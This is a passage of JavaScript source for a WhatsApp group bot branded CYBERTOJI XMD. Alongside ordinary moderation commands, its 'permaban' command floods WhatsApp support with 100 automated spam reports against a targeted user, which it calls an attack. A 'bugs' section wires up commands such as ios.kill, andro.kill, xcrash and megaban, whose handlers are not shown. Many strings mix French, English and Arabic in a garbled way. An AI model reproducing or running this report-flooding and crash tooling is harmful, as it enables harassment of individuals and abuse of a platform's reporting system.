          text: `🚫 Anti-Spam: ${settingsSpam.antispam ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n${settingsSpam.antispam ? 'Le spam sera détecté et bloqué automatiquement.' : 'La détection de spam est désactivée.'}`
        });
        break;

      case 'warn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminWarn = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWarn && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedWarn = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedWarn) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *Système d'avertissement*\n\nUtilisation:\n${config.prefix}warn @user raison - Avertir\n${config.prefix}resetwarn @user - Réinitialiser\n${config.prefix}warns @user - Voir les warns`
          });
          break;
        }

        const reason = args.slice(1).join(' ') || 'Aucune raison spécifiée';
        const settingsWarn = initGroupSettings(remoteJid);
        const warnCount = addWarn(remoteJid, mentionedWarn, reason);
        
        await sock.sendMessage(remoteJid, {
          text: `⚠️ @${mentionedWarn.split('@')[0]} a reçu un avertissement!\n\nRaison: ${reason}\nWarnings: ${warnCount}/${settingsWarn.maxWarns}`,
          mentions: [mentionedWarn]
        });

        if (warnCount >= settingsWarn.maxWarns) {
          const botIsAdminWarn = await isBotGroupAdmin(sock, remoteJid);
          if (botIsAdminWarn) {
            await sock.groupParticipantsUpdate(remoteJid, [mentionedWarn], 'remove');
            await sock.sendMessage(remoteJid, {
              text: `❌ @${mentionedWarn.split('@')[0]} a été expulsé (${settingsWarn.maxWarns} warnings)`,
              mentions: [mentionedWarn]
            });
            resetWarns(remoteJid, mentionedWarn);
          }
        }
        break;

      case 'resetwarn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminReset = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminReset && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedReset = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedReset) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}resetwarn @user`
          });
          break;
        }

        resetWarns(remoteJid, mentionedReset);
        await sock.sendMessage(remoteJid, {
          text: `✅ Warnings réinitialisés pour @${mentionedReset.split('@')[0]}`,
          mentions: [mentionedReset]
        });
        break;

      case 'warns':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const mentionedWarns = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || senderJid;
        const userWarns = getWarns(remoteJid, mentionedWarns);
        const settingsWarns = initGroupSettings(remoteJid);
        
        if (userWarns.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedWarns.split('@')[0]} n'a aucun avertissement`,
            mentions: [mentionedWarns]
          });
        } else {
          let warnText = `⚠️ Warnings de @${mentionedWarns.split('@')[0]}\n\nTotal: ${userWarns.length}/${settingsWarns.maxWarns}\n\n`;
          userWarns.forEach((warn, index) => {
            const date = new Date(warn.timestamp).toLocaleString('fr-FR');
            warnText += `${index + 1}. ${warn.reason}\n   📅 ${date}\n\n`;
          });
          
          await sock.sendMessage(remoteJid, {
            text: warnText,
            mentions: [mentionedWarns]
          });
        }
        break;

      case 'acceptall':
      case 'accept-all':
      case 'acceptrequests':
      case 'approuver': {
        if(!isGroup){await sock.sendMessage(remoteJid,{text:'❌ Groupes seulement.'},{ quoted: message });break;}
        const _isAdminAcc=await isGroupAdmin(sock,remoteJid,senderJid);
        if(!_isAdminAcc&&!isAdmin(senderJid)){await sock.sendMessage(remoteJid,{text:'⛔ Admin requis.'},{ quoted: message });break;}
        const _botIsAdminAcc=await isBotGroupAdmin(sock,remoteJid);
        if(!_botIsAdminAcc){await sock.sendMessage(remoteJid,{text:'❌ Le bot doit être admin.'},{ quoted: message });break;}
        try{
          let _pending=[];
          try{_pending=await sock.groupRequestParticipantsList(remoteJid);}catch(e){}
          if(!_pending||!_pending.length){
            const _meta=await sock.groupMetadata(remoteJid);
            const _raw=(_meta.participants||[]).filter(p=>p.pending===true||p.request_method==='invite').map(p=>({jid:p.id}));
            if(_raw.length)_pending=_raw;
          }
          if(!_pending||!_pending.length){await sock.sendMessage(remoteJid,{text:'📭 Aucune demande en attente.'},{ quoted: message });break;}
          await sock.sendMessage(remoteJid,{text:'⏳ Acceptation de '+_pending.length+' demande(s)...'},{ quoted: message });
          const _jids=_pending.map(p=>p.jid);
          let _accepted=0;
          for(let i=0;i<_jids.length;i+=20){
            const _batch=_jids.slice(i,i+20);
            try{await sock.groupRequestParticipantsUpdate(remoteJid,_batch,'approve');_accepted+=_batch.length;if(i+20<_jids.length)await new Promise(r=>setTimeout(r,1200));}catch(e){}
          }
          await sock.sendMessage(remoteJid,{text:'✅ '+_accepted+'/'+_pending.length+' demandes acceptées.'});
        }catch(e){await sock.sendMessage(remoteJid,{text:'❌ Erreur: '+e.message},{ quoted: message });}
        break;
      }

      case 'promote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPromote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPromote && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPromote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPromote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour promouvoir' });
          break;
        }

        const mentionedPromote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedPromote) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}promote @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedPromote], 'promote');
          await sock.sendMessage(remoteJid, {
            text: `👑 @${mentionedPromote.split('@')[0]} est maintenant admin!`,
            mentions: [mentionedPromote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ lors de la promotion' });
        }
        break;

      case 'demote':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminDemote = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminDemote && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminDemote = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminDemote) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour rétrograder' });
          break;
        }

        const mentionedDemote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedDemote) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}demote @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedDemote], 'demote');
          await sock.sendMessage(remoteJid, {
            text: `📉 @${mentionedDemote.split('@')[0]} n'est plus admin`,
            mentions: [mentionedDemote]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ lors de la rétrogradation' });
        }
        break;

      case 'add':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminAdd = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminAdd && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminAdd = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminAdd) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour ajouter des membres' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}add 33612345678`
          });
          break;
        }

        const numberToAdd = args[0].replace(/[^0-9]/g, '');
        if (numberToAdd.length < 10) {
          await sock.sendMessage(remoteJid, { text: '❌ Numéro invalide' });
          break;
        }

        try {
          const jidToAdd = `${numberToAdd}@s.whatsapp.net`;
          await sock.groupParticipantsUpdate(remoteJid, [jidToAdd], 'add');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${numberToAdd} a été ajouté au groupe`,
            mentions: [jidToAdd]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: `❌ Unable d'ajouter ce numéro\nVérifiez:\n- Le numéro est correct\n- La personne n'a pas quitté récemment\n- Les paramètres de confidentialité` 
          });
        }
        break;

      case 'kick':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminKick = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKick && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKick = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKick) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour expulser' });
          break;
        }

        const mentionedKick = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedKick) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}kick @user`
          });
          break;
        }

        try {
          await sock.groupParticipantsUpdate(remoteJid, [mentionedKick], 'remove');
          await sock.sendMessage(remoteJid, {
            text: `👢 @${mentionedKick.split('@')[0]} a été expulsé`,
            mentions: [mentionedKick]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ lors de l\'expulsion' });
        }
        break;

      case 'permaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminPermaBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminPermaBan && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminPermaBan = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminPermaBan) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour bannir' });
          break;
        }

        const mentionedBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedBan) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *PERMABAN - Bannissement Permanent*\n\nUtilisation:\n${config.prefix}permaban @user raison\n\nCette personne sera:\n• Expulsée du groupe\n• Signalée 100 fois à WhatsApp\n• Bloquée de rejoindre le groupe\n\n⚠️ تحذير: Cette action est irréversible pour le signalement!\n\nCommandes liées:\n${config.prefix}unpermaban @user - Retirer le ban\n${config.prefix}banlist - Voir la liste des bannis`
          });
          break;
        }

        const banReason = args.slice(1).join(' ') || 'Comportement inapproprié';
        
        // Vérifier si déjà banni
        if (isPermaBanned(remoteJid, mentionedBan)) {
          await sock.sendMessage(remoteJid, {
            text: `⚠️ @${mentionedBan.split('@')[0]} est déjà banni définitivement!`,
            mentions: [mentionedBan]
          });
          break;
        }

        try {
          // Message d'avertissement
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║    ⚠️ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗   ║
╚═══════════════════════════════════╝

🎯 الهدف: @${mentionedBan.split('@')[0]}
📝 Raison: ${banReason}
⚡ Action: Expulsion + Signalement massif

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ Initialisation de l'attaque...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
            mentions: [mentionedBan]
          });

          await delay(2000);

          // Expulser la personne
          await sock.groupParticipantsUpdate(remoteJid, [mentionedBan], 'remove');
          
          // Ajouter au permaban
          addPermaBan(remoteJid, mentionedBan, banReason, senderJid);
          
          // Message de progression
          const progressMsg = await sock.sendMessage(remoteJid, {
            text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: 0/100\n🎯 الهدف: @${mentionedBan.split('@')[0]}\n\n⏳ Please patienter...`,
            mentions: [mentionedBan]
          });

          // SIGNALEMENT MASSIF - 100 fois
          let reportCount = 0;
          const totalReports = 100;
          const batchSize = 10; // Signaler par batch de 10

          for (let i = 0; i < totalReports; i += batchSize) {
            try {
              // Batch de تقرير
              for (let j = 0; j < batchSize && (i + j) < totalReports; j++) {
                try {
                  // Envoyer le signalement à WhatsApp
                  await sock.sendMessage('support@s.whatsapp.net', {
                    text: `Report spam from ${mentionedBan}`
                  });
                  
                  reportCount++;
                } catch (reportخطأ) {
                  console.error('خطأ sending report:', reportخطأ);
                }
              }

              // Mise à jour de la progression toutes les 20 reports
              if (reportCount % 20 === 0 || reportCount === totalReports) {
                const percentage = Math.floor((reportCount / totalReports) * 100);
                const progressBar = '█'.repeat(Math.floor(percentage / 5)) + '░'.repeat(20 - Math.floor(percentage / 5));
                
                await sock.sendMessage(remoteJid, {
                  text: `⚡ *SIGNALEMENT EN COURS*\n\n📊 Progression: ${reportCount}/${totalReports}\n[${progressBar}] ${percentage}%\n🎯 الهدف: @${mentionedBan.split('@')[0]}\n\n${reportCount === totalReports ? '✅ TERMINÉ!' : '⏳ جارٍ...'}`,
                  mentions: [mentionedBan],
                  edit: progressMsg.key
                });
              }

              // Délai pour éviter le rate limit
              if (i + batchSize < totalReports) {
                await delay(500);
              }
            } catch (error) {
              console.error('خطأ in report batch:', error);
            }
          }

          // Message final
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ✅ 𝗣𝗘𝗥𝗠𝗔𝗕𝗔𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧   ║
╚═══════════════════════════════════╝

🎯 *الهدف:* @${mentionedBan.split('@')[0]}
📝 *Raison:* ${banReason}
👤 *Par:* @${senderJid.split('@')[0]}
📅 *Date:* ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ *ACTIONS EFFECTUÉES:*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ Expulsion du groupe
2️⃣ ${reportCount} تقرير envoyés à WhatsApp
3️⃣ Bannissement permanent activé

⚠️ Cette personne sera automatiquement expulsée si elle rejoint à nouveau.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
  "You remember me?"`,
            mentions: [mentionedBan, senderJid]
          });
          
          console.log(`✅ Permaban + ${reportCount} reports appliqués: ${mentionedBan} dans ${remoteJid}`);
        } catch (error) {
          console.error('خطأ in permaban:', error);
          await sock.sendMessage(remoteJid, { 
            text: '❌ خطأ lors du bannissement. La personne a peut-être déjà quitté le groupe.' 
          });
        }
        break;

      case 'unpermaban':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnBan = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnBan && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedUnBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnBan) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}unpermaban @user`
          });
          break;
        }

        if (!isPermaBanned(remoteJid, mentionedUnBan)) {
          await sock.sendMessage(remoteJid, {
            text: `ℹ️ @${mentionedUnBan.split('@')[0]} n'est pas banni.`,
            mentions: [mentionedUnBan]
          });
          break;
        }

        const banInfo = getPermaBanInfo(remoteJid, mentionedUnBan);
        removePermaBan(remoteJid, mentionedUnBan);
        
        await sock.sendMessage(remoteJid, {
          text: `✅ *PERMABAN RETIRÉ*\n\n@${mentionedUnBan.split('@')[0]} peut à nouveau rejoindre le groupe.\n\nBanni depuis: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nRaison du ban: ${banInfo.reason}\nRetiré par: @${senderJid.split('@')[0]}`,
          mentions: [mentionedUnBan, senderJid]
        });
        
        console.log(`✅ Permaban retiré: ${mentionedUnBan} dans ${remoteJid}`);
        break;

      case 'banlist':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const groupBans = getAllPermaBans(remoteJid);
        
        if (groupBans.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: '✅ Aucune personne bannie dans ce groupe.'
          });
          break;
        }

        let banListText = `╔═══════════════════════════════════╗
║     🚫 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗕𝗔𝗡𝗦     ║
╚═══════════════════════════════════╝

📊 Total: ${groupBans.length} personne(s) bannie(s)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

        groupBans.forEach((ban, index) => {
          const date = new Date(ban.timestamp).toLocaleDateString('fr-FR');
          banListText += `\n${index + 1}. @${ban.userJid.split('@')[0]}\n`;
          banListText += `   📝 Raison: ${ban.reason}\n`;
          banListText += `   📅 Date: ${date}\n`;
          banListText += `   👤 Par: @${ban.bannedBy.split('@')[0]}\n`;
        });

        banListText += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        banListText += `💡 Utilisez ${config.prefix}unpermaban @user pour retirer un ban`;

        const mentions = groupBans.flatMap(ban => [ban.userJid, ban.bannedBy]);

        await sock.sendMessage(remoteJid, {
          text: banListText,
          mentions: mentions
        });
        break;

      // =============================================
      // NOUVELLES COMMANDES GROUPE
      // =============================================

      case 'mute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminMute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminMute && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminMute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminMute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour mute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔇 Groupe en mode *MUET*\n\nSeuls les admins peuvent envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ lors du mute' });
        }
        break;

      case 'unmute':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminUnmute = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminUnmute && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminUnmute = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminUnmute) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin pour unmute' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'not_announcement');
          await sock.sendMessage(remoteJid, {
            text: '🔊 Groupe en mode *OUVERT*\n\nTout le monde peut envoyer des messages.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ lors du unmute' });
        }
        break;

      case 'invite':
      case 'lien':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const inviteCode = await sock.groupInviteCode(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: `🔗 *Lien d'invitation du groupe*\n\nhttps://chat.whatsapp.com/${inviteCode}`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ Unable de récupérer le lien. Je dois être admin.' 
          });
        }
        break;

      case 'revoke':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminRevoke = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminRevoke && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupRevokeInvite(remoteJid);
          await sock.sendMessage(remoteJid, {
            text: '✅ Lien d\'invitation réinitialisé!\n\nL\'ancien lien ne fonctionne plus.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { 
            text: '❌ خطأ. Je dois être admin.' 
          });
        }
        break;

      case 'glock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGlock && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'locked');
          await sock.sendMessage(remoteJid, {
            text: '🔒 Paramètres du groupe *VERROUILLÉS*\n\nSeuls les admins peuvent modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'gunlock':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGunlock = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGunlock && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        try {
          await sock.groupSettingUpdate(remoteJid, 'unlocked');
          await sock.sendMessage(remoteJid, {
            text: '🔓 Paramètres du groupe *DÉVERROUILLÉS*\n\nTout le monde peut modifier les infos du groupe.'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'gname':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGname = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGname && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}gname <nouveau nom>`
          });
          break;
        }

        const newGroupName = args.join(' ');
        try {
          await sock.groupUpdateSubject(remoteJid, newGroupName);
          await sock.sendMessage(remoteJid, {
            text: `✅ Nom du groupe changé en:\n*${newGroupName}*`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'gdesc':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminGdesc = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGdesc && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `الاستخدام: ${config.prefix}gdesc <nouvelle description>`
          });
          break;
        }

        const newGroupDesc = args.join(' ');
        try {
          await sock.groupUpdateDescription(remoteJid, newGroupDesc);
          await sock.sendMessage(remoteJid, {
            text: `✅ Description du groupe modifiée!`
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'groupinfo':
      case 'infos':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const admins = metadata.participants.filter(p => p.admin).length;
          const members = metadata.participants.length;
          const desc = metadata.desc || 'Aucune description';
          const owner = metadata.owner || 'Inconnu';
          const created = metadata.creation ? new Date(metadata.creation * 1000).toLocaleDateString('fr-FR') : 'Inconnu';

          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║      📊 𝗜𝗡𝗙𝗢𝗦 𝗚𝗥𝗢𝗨𝗣𝗘      ║
╚═══════════════════════════════════╝

📌 *Nom:* ${metadata.subject}

👥 *الأعضاء:* ${members}
👑 *المسؤولون:* ${admins}
🔐 *المنشئ:* @${owner.split('@')[0]}
📅 *Créé le:* ${created}

📝 *الوصف:*
${desc}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
            mentions: [owner]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'listonline':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          let onlineList = `╔═══════════════════════════════════╗
║    📱 𝗠𝗘𝗠𝗕𝗥𝗘𝗦 𝗘𝗡 𝗟𝗜𝗚𝗡𝗘    ║
╚═══════════════════════════════════╝

`;

          let count = 0;
          for (const participant of participants) {
            try {
              const status = await sock.fetchStatus(participant.id);
              if (status) {
                count++;
                onlineList += `${count}. @${participant.id.split('@')[0]}\n`;
              }
            } catch (e) {
              // Ignore les erreurs
            }
          }

          onlineList += `\n📊 Total: ${count} membre(s) en ligne`;

          await sock.sendMessage(remoteJid, {
            text: onlineList,
            mentions: participants.map(p => p.id)
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ خطأ' });
        }
        break;

      case 'jid':
        const jidToShow = isGroup ? senderJid : remoteJid;
        await sock.sendMessage(remoteJid, {
          text: `📱 *Votre JID:*\n\n\`${jidToShow}\`\n\nCopiez-le pour l'utiliser comme admin.`
        });
        break;

      case 'quoted':
      case 'q':
        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌ رد على رسالة' });
          break;
        }

        const quotedMsg = message.message.extendedTextMessage.contextInfo.quotedMessage;
        const quotedText = quotedMsg.conversation || quotedMsg.extendedTextMessage?.text || 'Message sans texte';
        
        await sock.sendMessage(remoteJid, {
          text: `📝 *Message cité:*\n\n${quotedText}`
        });
        break;

      case 'checkban':
      case 'bancheck':
      case 'isban':
        await handleCheckBan(sock, args, remoteJid, senderJid, message);
        break;

      // =============================================
      // COMMANDES BUGS 🪲
      // =============================================

      case 'kill.gc':
      case 'killgc':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleKillGC(sock, args, remoteJid, senderJid, message);
        break;

      case 'ios.kill':
      case 'ioskill':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleIOSKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'andro.kill':
      case 'androkill':
      case 'androidkill':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleAndroKill(sock, args, remoteJid, senderJid, message);
        break;

      case 'silent':
      case 'report':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleSilent(sock, args, remoteJid, senderJid, message);
        break;

      case 'bansupport':
      case 'bansupp':
      case 'xban':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleBanSupport(sock, args, remoteJid, senderJid, message);
        break;

      case 'xcrash':
      case 'megaban':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleMegaBan(sock, args, remoteJid, senderJid, message);
        break;

      case 'updatedev':
      case 'devupdate':
      case 'managedev':
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ للمسؤولين فقط' });
          break;
        }
        await handleUpdateDev(sock, args, remoteJid, senderJid);
        break;

      case 'update':
      case 'maj':
      case 'upgrade': {
        if (!isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
          break;
        }
        await sock.sendMessage(remoteJid, {
          text:
`\uD83D\uDD04 *MISE \u00C0 JOUR CYBERTOJI XMD*
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
\u23F3 T\u00E9l\u00E9chargement depuis GitHub...
\uD83D\uDD17 https://github.com/lord007-maker/CYBERTOJI-XMD-.git`
        }, { quoted: message });

        const { execSync, exec } = require('child_process');
        const _repoUrl = 'https://github.com/lord007-maker/CYBERTOJI-XMD-.git';
        const _cwd = process.cwd();

        try {
          // Vérifier si git est disponible
          execSync('git --version', { stdio: 'ignore' });

          // Sauvegarder les fichiers config locaux
          const _filesToKeep = ['creds.json', '.env', 'database.json', 'session'];

          // Git pull
          const _gitOut = execSync('git pull origin main 2>&1 || git pull origin master 2>&1', {
            cwd: _cwd, encoding: 'utf8', timeout: 30000
          });

          const _isUpToDate = _gitOut.includes('Already up to date') || _gitOut.includes('up-to-date');

          if (_isUpToDate) {
            await sock.sendMessage(remoteJid, {
              text:
`\u2705 *D\u00E9j\u00E0 \u00E0 jour!*
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
